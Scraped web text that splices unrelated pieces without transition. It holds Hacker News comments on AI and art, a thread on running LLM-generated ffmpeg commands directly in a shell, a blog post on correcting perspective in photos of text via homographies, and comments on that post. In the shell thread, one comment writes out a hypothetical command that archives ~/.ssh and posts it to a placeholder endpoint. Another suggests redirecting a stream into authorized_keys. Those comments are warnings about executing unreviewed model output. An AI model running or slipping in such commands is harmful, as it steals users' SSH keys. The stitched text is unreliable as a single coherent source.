agorootparentThat was one of the first books on computer graphics. I loved it. I will admit that as a software dev and a former 3d modeller and animator I may be too close to how the digital paint and canvas are made to get excited. Another reason is the infinite number of works that can be produced by machines running the same algorithms, which has an unfortunate effect of turning artworks from an event to mass-produced objects (or renderings on LCD screens). That mass-production aspect removed barriers to entry to become an artist, see the deluge of \"abstract art\" on Etsy and hundreds of tutorials on how to produce it on YouTube. There just isn't anything special about it. I understand that this is not new, painters are still salty about photography and photographers are not happy about digital distribution of their works on a mass scale without compensation. And I know that mass production of artworks is not new; in the past, master painters or engravers ran workshops that produced works \"in the style of\" too. Still, there was some effort required to produce such works. I think the perception of generative art suffers from the same thing that makes it possible: ease of access to a lot of compute power for next to nothing. I spent over 10 years of my life working with 3d graphics and finally went back to photography and recently to film photography. I feel more involved in the process of creation and there is a physical artifact at the end of the process. Once it is produced it needs no power to enjoy it unlike generative art that needs a screen to be seen (some of it can be printed in 2d or 3d). As for AI, I see it as a threat to all who invested their time and effort into creating business models that support them in the digital domain. That value is being taken away from them now. Technology applied to the creative space has always been about improving efficiency of the creative process and offering new tools, but this time round there is an assumption that all that we create is fair game for the AI companies and that we should accept it while they monetize it. There is no model for the creator to make a living from his creations in the AI space and I think that's dishonest. reply barfbagginus 5 hours agorootparentThe model for creators to make a living after AI hoovers everything up is simple: it's called revolution. You pull up on the wealthy person, and you take ownership of their AI, and make it free and open source for all. Then the AI production system can provide for any quality of life needs, and you no longer have to do any art for any reason other than you enjoy it. Remember, art is fundamentally worthless bullshit that we do because life is miserable and terrifying, and we're obsessive miserable bastards. There's no reason to make it a living, except to enslave artists to the whims of the wealthy. We can just take from the wealthy, instead. Seize the means of production from capitalists, and you'll be free to be make art without the added misery of having to please bastards with too much money and no real love of the process of art.

Also, significantly more people use stdlib, there is more knowledge on the internet, and xz-style supply chain attacks are significantly less likely. This is why my advice to everyone is to use python's stdlib as much as possible, and avoid using Python's external libraries unless they significantly simplify code. Plumbum seems nice (and also is packaged in debian/ubuntu, which is a plus), but it does not seem to be significantly safer than correctly written subprocess code, and it won't even save that much lines in this particular example. reply ajsnigrutin 16 hours agoparentprevI'm pretty sure you can dump a stream without transcoding directly to a file, and the stream can be sourced from an url, and the destination file can be users ssh authorized_keys reply pseudosavant 15 hours agorootparentAnd the GPT-4 API would want to respond with an output to do that when that isn't what the user asked for? reply jesprenj 12 hours agorootparentI am almost certain one can find a seed+temperature pair that will result in such output given a non-malicious prompt. reply parentheses 15 hours agoparentprevquoting is the enemy. reply a_t48 15 hours agorootparentshlex.quote all the things.

Never ask a remote endpoint that's not owned by you and not run by you, what commands you should run on your system. Certainly don't execute the answers. reply lucianbr 9 hours agorootparent99.9999% of the code running on my machine is written by others and not even readable to me. I'm pretty optimistic that a similar percentage is true on your machines. So yeah, we run remote commands all the time, all of us. There may be a subtle difference between \"curl somethingbash\" and \"apt-get install\" or \"setup.exe\", but there is no fundamental one. reply amiga386 7 hours agorootparentFundamentally: 1. the packages being worked on by Debian et al have a huge pile of infrastructure so that their development happens collaboratively and in the open, with many eyes watching 2. everyone gets the same packages 3. they have their own security teams to _ensure_ everyone is getting the same packages, i.e. that their download servers and checksums haven't been compromised 4. the project has been been working since 1993 to ensure their update system, and the system delivered by those updates, works as expected. If it doesn't, there are IRC channels, mailing lists, bug trackers and a pile of humans to discuss issues with, and if they agree it's a bug, they can fix it for everyone It's not to say it's impossible to sneak an attack past a project dedicated to stopping such attacks, but it's so much more work compared to attacking someone who executes whatever a remote endpoint tells them reply tucosan 7 hours agorootparentThere have been many documented cases of supply chain attacks of various degrees of sophistication. Some of them successful, some of them almost successful. May I remind you of the recent xz vulnerability was discovered by a single dev by mere chance. As an end user it is nearly impossible to guard against such an attack. It can be problematic to run something like `curl foo.combash` without inspection of the script first. But even here it makes a difference if you are curling from a project like brew.sh that delivers such script from a TLS protected endpoint or some random script you find somewhere in a gist. Same goes for output from an LLM. You can simply investigate the generated command before executing it. Another strategy might be to only generate the parameters and just pass those to the ffmpeg executable. reply amiga386 5 hours agorootparent> Same goes for output from an LLM This is the crux of our disagreement. It does not go the same. You have no idea what the LLM is going to write, neither does the LLM, nor the people who created the LLM. At no point did the people who created the LLM actually think about your use-case, nor did the LLM, and there is no promise of anything you ask getting a correct, or even consistent answer. The creators don't know how the answers got there, and can't easily fix them if they're wrong. You'd be a fool to trust it for anything other than dog and pony shows. reply tucosan 3 hours agorootparent> This is the crux of our disagreement. No it's not. There is an observable and testable probability that an LLMs output is correct or false. There is an observable and testable probability that code created by humans is erroneous. There is a third category where human code is malicious. You will need to guard against all three cases. Guarding against a possibly faulty LLM output that is passed to ffmpeg is significantly easier to realise through defensive prompting and simple sanitization techniques, than to protect against a malicious state actor that is capable of crafting sophisticated supply chain attacks that took years to develop and roll out (again see the xz backdoor). The idea that you can blindly trust an open source project just because \"their development happens collaboratively and in the open\" is naive. Some open source projects people are building their whole infrastructure on are maintained by a single developer in their spare time. The attack surface is huge and has been exploited time and time again. Just because a project like Debian has signed packages and a security team doesn't guarantee that the underlying code doesn't have some malicious backdoor or some grave bug that creates a big attack surface. reply amiga386 2 hours agorootparentNobody said anything about blind trust, but that's what's being exhibited here, in trusting the output of a stochastic parrot that can't even reason. You've _really_ shifted the goalposts here. Do you trust in _your_ ability, to what you think requires no more than \"defensive prompting and simple sanitization techniques\"... to be robust against, say \"a malicious state actor that is capable of crafting sophisticated supply chain attacks\"? You know there's not just one, right? And you know if you're consuming a closed product, you can't even verify its correctness for yourself, let alone be able to tell if a \"malicious state actor\" is actually the one sending you LLM answers. You can't follow along with the development process. Its actors don't make their changes in public. You can't look back a history of all their actions. A \"malicious state actor\" would laugh at your \"simple sanitization\" and use logic and reason to know where your code is vulnerable and change what you think will be an ffmpeg command into something that actually probes your network, downloads all the files, encrypts them and posts you a ransom note from your own mailservers. When both scenarios have bad actors and attack surfaces, which would you rather do: 1. Look up the ffmpeg manual, or ask a search engine and find StackOverflow answer, or heck even ask an LLM... but then go through the manual and _understand the command_ you're running, and what its human authors have written about its capabilities. Ensure you use the correct settings and you know what they do and you've reasoned as to why they're correct - and put that in your script. 2. Make no attempt to understand ffmpeg. Put a command in your script that makes a network call to a proprietary service you don't control, and 100% put your faith that it _always_ returns the correct command for the same prompt - each time you run it. And that service never gets interrupted. And that service is never hacked, nor its staff compromised, nor its models poisoned, etc. Honestly, this is as braindead as people using PHP fopen() to access URLs for files they could host locally. EDIT: bonus question. Would you ask an LLM \"please send me an ffmpeg binary for linux x86_64 that automatically splits the output from /dev/video0 into timeslices\" ? If it gave you a binary back, would you run it in preference to the normal ffmpeg binary with a provenance of where it came from? reply theamk 2 hours agorootparentprevI'd say \"discovered by a single dev\" is not just mere chance, but system working as designed. - Everyone was getting the same package, so one person could warn others - There were well-established procedures for code updates (Andres Freund _knew_ that xz was recently updated, and could go back and forth in previous versions) - There was access to all steps of the process - git repo with commit history, binary releases, build scripts, extensive version info None of this is true for LLMs (and only some of this is true for curl|bash, sometimes) - it's a opaque binary service for which you have no version info, no history, and everyone gets a highly customized output. Moreover, there has been documented examples of LLM giving flawed code with security issues and (unlike debian!) everyone basically says \"that person got unlucky, this won't happen to me\" and keeps using the very same version. So please don't compare traditional large open-source projects with LLMs - their risk profiles are very different, and LLM's are a way more dangerous. reply broken-kebab 7 hours agorootparentprevThere's a difference between getting code from a repo, and from AI generator though. We can apply an ancient thing known as \"reputation\" to the former. Not yet to the latter. reply madeofpalk 4 hours agorootparentprevYou never search for documentation?

I'd say it's a pretty common idea today to ask chatGPT for help in complicated commands. Putting it in the shell directly is smart and helpful. Maybe the implementations has some flaws (it seems quite unsafe), but the idea is rather good in my opinion. reply axegon_ 3 hours agorootparentHere's a hypothetical but very real scenario: someone discovers a vulnerability in openAI's API (vulnerabilities are everywhere these days), you prompt it to do something for you and it sends the following command: tar -czf bla.tar.gz ~/.ssh && curl -X POST -F \"ssh_keys=@bla.tar.gz\" SOME_HTTP_API_ENDPOINT && rm -f bla.tar.gz && THE_ACTUAL_COMMAND_YOU_PROMPTED What could possibly go wrong, right? reply tirpen 8 hours agorootparentprevGetting a suggested command from a chat bot is not a terrible idea. Directly executing commands given by a chat bot on your machine it without inspecting it first is pure madness. reply fragmede 10 hours agoparentprevyou'd really like http://openinterpreter.com then reply terribleperson 15 hours agoprevI'm not quite ready to execute arbitrary output from an LLM. Maybe with more guardrails and if it could guarantee it would only operate inside of a chosen folder, and would back up the folder ahead of time. reply dheera 10 hours agoparentOne relatively easy way to be safe is to do this inside a docker container with only whatever files you're working with mounted inside. I created a new script (https://github.com/dheera/scripts/blob/master/helpme) that is more general, and is safer by presenting the command and requiring you to type \"y\" to execute, and does NOT auto-execute after a delay. That said, I do believe we are re-living the autonomous car question of \"what about the 0.000001%\" again and in this case the absolute worst that happens is it wipes your system, and that's a disaster that's extremely easy to prepare for. You could do all your work in a VM and take daily snapshots, among other solutions. As long as the computer isn't wired up to some weapon, I say deploy now, let's not wait a decade. This world is too awesome to pass up just because of some \"rm -rf\" level risks. If that happens I'll just kick myself for not buying a lottery ticket because the probability of ChatGPT responding to an ffmpeg question with \"rm -rf\" is far, far lower than winning the lottery. reply terribleperson 32 minutes agorootparentWhile I am concerned about the rm -rf possibility and that's what my initial comment was about, it's not the only concern. I'm also concerned ChatGPT will return a ffmpeg command that is functional but suboptimal, creating a product that's subtly wrong. For example, a slideshow that's subtly misordered, a video file that's 10x the size it needs to be, compromised audio quality, or a video that runs fine on my PC but has poor portability (video players can be surprisingly finicky). When I look up ffmpeg commands on stackexchange, there's always feedback on any suggested command that explains what's wrong with it and what a better solution is. Often the first solution will work, but maybe only with certain ffmpeg distributions or there are major caveats to the result. I do appreciate the container solution, since it's generalizable to other ai-powered tools in this class. reply djyde 1 hour agoprevIf you are concerned about security risks, just add a confirm CLI prompt before running, to ask the user to confirm whether to execute the code (Y/N) reply imjonse 4 hours agoprevThis is what llm cmd does for any command, and it also offers a chance to edit it before running https://github.com/simonw/llm-cmd reply epiccoleman 3 hours agoparentI've been using shell-gpt[1] for the same, and it is almost irritatingly useful.

Find out below, and be sure to check out the code on github afterwards… Background A while before my page dewarping project, I was already thinking about how to undo the effects of 3D projection on photographs of text. In the spring of 2016, I advised a couple of students working on a combined optical character recognition (OCR) and translation smartphone app for their Engineering senior design project. Their app was pretty cool – it used Tesseract OCR along with the Google Translate API to translate images in the user’s photo library. Users had to be careful, however, to photograph the text they wanted to translate head-on, so as to avoid strong perspective distortion of the type evidenced beautifully in the opening crawl for each of the Star Wars films: Yep, just try running that thru OCR. Won’t work. One my students found an interesting paper by Carlos Merino-Gracia et al. on how to undo this type of keystoning. When I looked it over, I wasn’t surprised that the students felt like they didn’t have time to implement it – to my eyes, the method seems sophisticated but also a bit complex. As these figures from the paper show, the method fits a quadrilateral to each line of the input text, which can then be rectified. This is useful but difficult because it requires detecting lines of text as the very first step. It’s kind of a “chicken and egg” problem: if the text were laid out horizontally, it would be trivial to detect lines; but the approach uses the detected lines in order to make the text horizontal! My goal was to solve the perspective recovery problem based upon a much simpler model of text appearance, namely that on average, all letters should be about the same size. I was really happy with the approach I ended up with in this project, especially because I got to learn some interesting math along the way. Although I’m sure its neither as accurate or as useful as the Merino-Gracia approach, it ended up producing persuasive results on my test inputs in pretty rapid order. Position/area correlations Let’s restate the principle that’s going to guide our approach to the perspective removal problem: On average, all letters should be about the same size. Because I don’t have a fancy text detector hanging around like Merino-Gracia et al.1, I’m going to make a huge simplifying assumption that that the image we’re processing basically contains only the text that we want to rectify, like for example, this one: In this case, we can use thresholding to obtain a clean bi-level image that separates letters from the background: …and then use connected component labeling to obtain the outline – or contour, in image processing lingo – of each individual letter, like so: Here I’ve tagged each detected contour with its enclosed area, to make it clear that area correlates significantly with the position in the image. For example, the N and the c way over on the left cover drastically fewer pixels than the x and the y on the far right. If you plot the position-area relationship along with the best-fit regression lines, the correlation becomes even more apparent: Our task is now pretty simple: if we want to remove the effects of perspective, all we have to do is to transform the image in such a way that the letter shapes tend to have uniform areas across the entire image – independent of their position. But before we get started, we had better define what type of mathematical transformation we’re going to apply to our image to correct it. Homographies: projections of planar objects The mapping that turns normal-looking 2D text into the exciting Star Wars crawl that seems to zoom past the camera in 3D is called a homography. Due to the geometric optics underlying image formation, any time we take a photograph of a planar object like a chessboard or a street sign, it gets mapped through one of these. Mathematically, we can think about a homography transforming some original \\((x, y)\\) point on the surface of our planar object to a destination point \\((x', y')\\) inside of the image, like this: There are a few different ways to represent homographies mathematically. Here’s a simple definition in terms of eight parameters \\(a\\) through \\(h\\): \\[x' = \\frac{ax + by + c}{gx + hy + 1} , \\quad y' = \\frac{dx + ey + f}{gx + hy + 1}\\] As a superset of rotations, translations, scaling transformations, and shear transformations, homographies encompass a wide variety of effects. We can consider the influence of each parameter individually: \\(a\\) and \\(e\\) control scale along the \\(x\\) and \\(y\\) axes, respectively \\(b\\) and \\(d\\) control shear along each axis (together with \\(a\\) and \\(e\\) they also influence rotation, too) \\(c\\) and \\(f\\) control translation along each axis \\(g\\) and \\(h\\) control perspective distortion along each axis The Shadertoy below shows how the appearance of Nyan Cat is altered as each parameter of the homography (from \\(a\\) to \\(h\\)) is changed individually. Press play in the bottom left corner to see the animation (you can also hit A to toggle extra animations because wheeee Nyan Cat). By jointly changing all eight parameters, we can represent every possible perspective distortion of a planar object. Furthermore, since homographies are invertible, we can also use them to warp back from a distorted image to the original, undistorted planar object. Homogeneous coordinates Note: this section assumes a bit of linear algebra knowledge – you can skim it, but the math here will shore up the ensuing section about ellipses. Remember how we said there are multiple ways to write down homographies? Well, here’s a matrix-based representation: \\[\\tilde{\\mathbf{p}}' = \\left[\\begin{array}{c} \\tilde{x}' \\\\ \\tilde{y}' \\\\ \\tilde{w}' \\end{array}\\right] = \\mathbf{H} \\tilde{\\mathbf{p}} = \\left[\\begin{array}{ccc} a & b & c \\\\ d & e & f \\\\ g & h & 1 \\end{array}\\right] \\left[\\begin{array}{c} x \\\\ y \\\\ 1 \\end{array}\\right] = \\left[\\begin{array}{c} ax + by + c \\\\ dx + ey + f \\\\ gx + hy + 1 \\end{array}\\right]\\] Denote by \\(\\mathbf{H}\\) the \\(3 \\times 3\\) matrix of parameters in the middle of the equation above. When we map the vector \\(\\tilde{\\mathbf{p}} = (x, y, 1)\\) through it, we get three outputs \\(\\tilde{x}'\\), \\(\\tilde{y}'\\), and \\(\\tilde{w}'\\). In order to obtain our final coordinates \\(x'\\) and \\(y'\\), we simply divide the former two by \\(\\tilde{w}'\\): \\[x' = \\frac{\\tilde{x}'}{\\tilde{w}'} = \\frac{ax + by + c}{gx + hy + 1}, \\quad y' = \\frac{\\tilde{y}'}{\\tilde{w}'} = \\frac{dx + ey + f}{gx + hy + 1}\\] You can verify that this is exactly the same as our first definition of a homography above, just expressed a little bit more baroquely. Go ahead and make sure, I’ll wait… Did it check out? Good. Fine, the two definitions are the same – who cares? Well, it turns out we just wrote down the the homography using homogeneous coordinates, which establish a beautiful mathematical correspondence between matrices and a large family of non-linear transformations like homographies. Anything you can do with the underlying transformations – such as composing two of them together – you can do in homogeneous coordinates with simple operations like matrix multiplication. And if the homogeneous representation of a transformation is an invertible matrix, then the parameters of the inverse transformation are straightforwardly obtained from the matrix inverse! So given our homography parameters \\(a\\) through \\(h\\), if we want to find the parameters of the inverse homography, all we need to do is compute \\(\\mathbf{H}^{-1}\\) and grab its elements.2 Equalizing areas as an optimization problem Let’s get back to our perspective recovery problem: we need to estimate a homography that will equalize the areas of all of the letters, once they’re all warped through it. Well, since \\(g\\) and \\(h\\) are the homography parameters that that determine the correlation between a shape’s position and its projected area, we should be able to find some setting for them that eliminates the correlation as much as possible. Therefore, we’ll fix the other six parameters for now, and just worry about producing the best possible perspective transformation of the form \\[\\mathbf{H}_P = \\left[\\begin{array}{ccc} 1 & 0 & 0 \\\\ 0 & 1 & 0 \\\\ g & h & 1 \\end{array}\\right]\\] By “best”, we mean the matrix that minimizes the total sum of squares of the warped contours’ areas, defined as: \\[SS_{total} = \\sum_{i=1}^n \\left(A_i - \\bar{A}\\right)^2\\] where \\(A_i\\) is the area of the \\(i^\\text{th}\\) warped contour (of which there are \\(n\\) total), and \\(\\bar{A}\\) is the mean of all of their areas. Minimizing this total sum of squares is akin to minimizing the sample variance of the contour areas. How do we accomplish this in practice? We just described an optimization problem: find the pair of parameters \\((g, h)\\) that minimizes the quantity above. There’s tons of ways to solve optimization problems, but when I’m in a hurry, I just hand them off to good old scipy.optimize.minimize. For all intents and purposes, we can consider it a “black box” that tries lots of different parameters, iteratively refining them until it finds the best combination. Tracking areas through homographies To evaluate our optimization objective, we’ll need to compute the areas of a bunch of contours. OpenCV accomplishes this via a variant of the shoelace formula, processing a contour consisting of \\(m\\) points in linear time of \\(O(m)\\). Despite this apparent efficiency, that’s actually bad news for us, because scipy.optimize.minimize has to compute the projected area for \\(n\\) contours (one for each letter) every time it wants to evaluate the optimization objective. If each contour consists of \\(m\\) points on average, our objective function would therefore take \\(O(mn)\\) time to run. To speed things up, we can replace each contour by a simpler “proxy” shape that is much easier to reason about. Here’s our letter contours once more: We’ll be replacing them with these ellipses: In the two images above, each red ellipse has the same area – that is, it covers the same number of pixels – as the green outlined letter that it replaces. There’s a few reasons I specifically chose ellipses as the proxy shape: They’re simple to describe – we can fully specify an ellipse with just five numbers. We can use them to not only match the area, but also the general aspect ratio and orientation of a letter (i.e. skinny or round, horizontal, vertical, or diagonal). Mapping an ellipse through a homography generally produces another ellipse.3 There are a couple of ways we can parameterize ellipses – let’s start with the canonical parameters \\((x_c, y_c, a, b, \\theta)\\), where \\((x_c, y_c)\\) is the center point, \\(a\\) and \\(b\\) are the semi-major and semi-minor axis lengths, and \\(\\theta\\) is the counterclockwise rotation of the ellipse from horizontal, as illustrated here: Given a contour outlining a letter, we can find the “closest” matching ellipse by choosing these parameters such that the center point and areas match up. We can also examine the second-order shape moments of the contour to match the letter’s aspect ratio and orientation as well. We can also represent an ellipse as the set of \\((x, y)\\) points that satisfy the implicit function \\[f(x, y) = Ax^2 + Bxy + Cy^2 + Dx + Ey + F = 0\\] where \\(A\\) through \\(F\\) are the parameters of our ellipse.4 We can switch back and forth between the two representations without changing the underlying mathematical object we’re describing – it’s just a matter of which one is more useful at the moment. Just like we did with the homography, we can express the implicit function parameters as elements of a matrix that operates on homogeneous coordinates. The new function looks like this: \\[f(\\tilde{\\mathbf{p}}) = \\tilde{\\mathbf{p}}^T \\mathbf{M} \\tilde{\\mathbf{p}} = \\left[\\begin{array}{ccc} x & y & 1 \\end{array}\\right] \\left[ \\begin{array}{ccc} A & B/2 & D/2 \\\\ B/2 & C & E/2 \\\\ D/2 & E/2 & F \\end{array}\\right] \\left[\\begin{array}{ccc} x \\\\ y \\\\ 1 \\end{array}\\right] = 0\\] As it turns out, if we want to map the entire ellipse through some homography \\(\\mathbf{H}\\) represented as a \\(3 \\times 3\\) matrix in homogeneous coordinates, we can compute the matrix \\[\\mathbf{M}' = \\mathbf{H}^{-T} \\mathbf{M} \\mathbf{H}^{-1}\\] and then straightforwardly obtain the parameters \\(A'\\) through \\(F'\\) of the the implicit function corresponding to the transformed ellipse by grabbing them out of the appropriate elements of \\(\\mathbf{M}'\\).5 To illustrate how ellipses get mapped through homographies, I created another Shadertoy. When the faint rectangle and ellipse at the center of the display through a homography we see that the rectangle may transform into an arbitrary quadrilateral; however, the inscribed ellipse is just transformed into another ellipse. Interestingly, the center point of the new ellipse (red dot) is not the same as the transformed center point of the original ellipse (green dot). Once again, press the play button in the lower left to see the figure animate. The bottom line of all this is that since there’s a closed-form formula for expressing the result of mapping an ellipse through a perspective transformation, it’s super efficient to model each letter as an ellipse for the purposes of running our objective function. Here is what the optimization process looks like as it refines the warp parameters to improve the objective function: The post-optimization, distortion-corrected image looks like this: You can see we have equalized the letters’ areas quite a bit, just by considering the action of the homography \\(\\mathbf{H}_P\\) on the collection of proxy ellipses. Composing the final homography Once the perspective distortion has been removed by finding the optimal \\((g, h)\\) parameters of the homography, we need to choose good values for the remaining parameters. In particular, we are concerned with the parameters \\((a, b, d, e)\\), which control rotation, scale, and skew. We will do this by composing the perspective transformation \\(\\mathbf{H}_P\\) discovered in the previous step with two additional transformations: a rotation-only transformation \\(\\mathbf{H}_R\\), and a skew transformation \\(\\mathbf{H}_S\\). To find the optimal rotation angle, we will take a Hough transform of the contours after being mapped through \\(\\mathbf{H}_P\\). Our input image is a binary mask indicating the edge pixels: …and here is the corresponding Hough transform: The Hough transform relates every possible line in the input image to a single pixel in the output image. Lines are parameterized by their orientation angle \\(\\theta\\) (with 0° being horizontal and ±90° being vertical), as well as their distance \\(r\\) from the image origin. In the Hough transform output image, the brightness of a pixel at \\((\\theta, r)\\) corresponds to the number of edge pixels detected along the line in the input image with angle \\(\\theta\\) and distance \\(r\\) from the origin. If a particular angle correlates well to the rotation of the text in the input image, its corresponding column in the Hough transform should be mostly zero pixels, with a small number of very bright pixels corresponding to the tops and bottoms of letters along parallel lines of the same angle. Conversely, angles which do not correlate well to the text rotation should have a more or less random spread of energy over all distances \\(r\\). To find the optimal rotation angle \\(\\theta\\), we simply identify the column (highlighted above in blue) of the Hough transform containing the most zero pixels. We can then create a rotation matrix of the form \\[\\mathbf{H}_R = \\left[ \\begin{array}{ccc} \\phantom{-}\\cos \\theta & \\sin \\theta & 0 \\\\ -\\sin \\theta & \\cos \\theta & 0 \\\\ 0 & 0 & 1 \\end{array}\\right]\\] to rotate the image back by the detected \\(\\theta\\) value. Here is the resulting image after warping first through \\(\\mathbf{H}_P\\) and then \\(\\mathbf{H}_R\\): Finally, taking a cue from Merino-Gracia et al., we create a skew transformation \\[\\mathbf{H}_S = \\left[ \\begin{array}{ccc} 1 & b & 0 \\\\ 0 & 1 & 0 \\\\ 0 & 0 & 1 \\end{array}\\right]\\] parameterized by a single skew parameter \\(b\\), that aims to reduce the width of the letters – this time using the convex hull of each detected contour as a proxy shape. Instead of minimizing the width of the widest letter, as Merino-Gracia et al. do, I found that on my inputs at least, using the soft maximum over hull widths gave nicer results than a straight-up maximum. Here’s the convex hulls after the rotation, but before the skew: And the same convex hulls after discovering the optimal skew with scipy.optimize.minimize_scalar: The final homography is given by composing the transformations we identified, applied in right-to-left order:6 \\[\\mathbf{H}_{final} = \\mathbf{H}_S \\, \\mathbf{H}_R \\, \\mathbf{H}_P\\] Other examples Here are a couple of other before/after image pairs. Input: Output: Input: Output: Conclusions and future work What started out as an interesting alternative take and/or simplification of an existing paper’s approach turned into a fun deep dive into the math underlying homographies and ellipses. I especially enjoyed producing the visualizations and animations underlying my own approach. Again, I don’t want to claim that the work I did is state-of-the-art or even that it’s superior to existing methods like Merino-Gracia et al. – I just relish the process of wrapping my head around a technical challenge and carving it up into a sequence of well-defined optimization problems, as I’ve done in the past with my image fitting and page dewarping posts. I hope you enjoyed scrolling through the blog post as much as I did creating it! Feel free to check out the code up on github. See http://citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.102.3729 ↩ Small caveat: we first need to divide \\(\\mathbf{H}^{-1}\\) by its bottom-right element so it becomes \\(1\\); or we just say “screw it” and represent homographies using nine parameters, ignoring scale. We were just gonna divide by \\(\\tilde{w}'\\) anyways… ↩ Technically, mapping any conic section through a homography always gives another conic section. It’s possible that some homographies might turn a given ellipse “inside out” into a parabola or a hyperbola. ↩ Careful readers will have noticed that there are five canonical parameters but six implicit function parameters, and might be wondering whether we picked up an extra degree of freedom when we switched representations? The answer is no – since we can multiply the entire implicit function by an arbitrary non-zero constant without changing the zero set, there are six parameters, but only five underlying degrees of freedom. In this case, we say the implicit function parameters are “defined up to scale”. ↩ Here’s the proof: we want it to be true that for all \\(\\tilde{\\mathbf{p}}' = \\mathbf{H} \\tilde{\\mathbf{p}}\\), the quantity \\(\\tilde{\\mathbf{p}}'^T \\mathbf{M}' \\tilde{\\mathbf{p}}' = \\tilde{\\mathbf{p}}^T \\mathbf{M} \\tilde{\\mathbf{p}}\\). That is, the value of the implicit function corresponding to the transformed ellipse, evaluated at the transformed point, should be the same as the original implicit function evaluated at the original point. This is true by construction if we define \\(\\mathbf{M}' = \\mathbf{H}^{-T} \\mathbf{M} \\mathbf{H}^{-1}\\) as above. ↩ You may have noticed we never discussed the translation parameters of the homography \\(c\\) and \\(f\\). That’s because I have to use them to “scroll” the entire image so it is visible below and to the right of the image origin at (0, 0). In fact, every image above that shows some warped image or contours is premultiplied by a translation transformation to make the image visible. ↩",

How does one simply find the bounding quad of rotated perspective text? Will that handle perspective distortion? I guess the author partly answers your question early on with discussion of the Merino-Gracia paper, which fits a quad to individual lines of text, and a comment about how that relies on first being able to detect lines of text. Matt also doesn’t claim this method is better. He says “I’m sure its neither as accurate or as useful as the Merino-Gracia approach.“ I assume the example text “Needlessly Complex” is a bit of self-deprecating humor, acknowledging he may not be taking the easiest path there is. But the method here seems interesting and useful to me for its approach; it doesn’t have to identify word or page boundaries, or lines of text, as a prerequisite. The assumptions are simple and the optimization is simple, it’s a nice study in different ways to think about the problem. reply yorwba 13 hours agorootparentThe method does have to identify lines of text to find the rotation angle, but doing so after perspective correction using the \"all letters should be about the same size\" assumption means that a Hough transform is enough for that step, since the lines should already be roughly parallel.

I have a copy of Jain et al and I can’t find what you’re describing. Do you have a link to something? The Hough transform is used in this article, if that’s what you’re thinking of, but that will not work to find the bounding box of text, the lines have to be solid, contiguous, and linear for that to work. Note the method in the article doesn’t depend on the text having a solid surround color, or even have the text arranged in a roughly rectangular shape. And it also doesn’t depend on the text being linear. These differences are valuable, not having to make the same assumptions you’re making, and it means this method (whether or not it’s “better”) may work in a wider variety of situations, or may make a very good complement to existing methods. reply kookamamie 13 hours agoparentprevAs the blog title has it, it's needlessly complex. reply DeathArrow 12 hours agoprev [–] I wonder how well does it work for images.
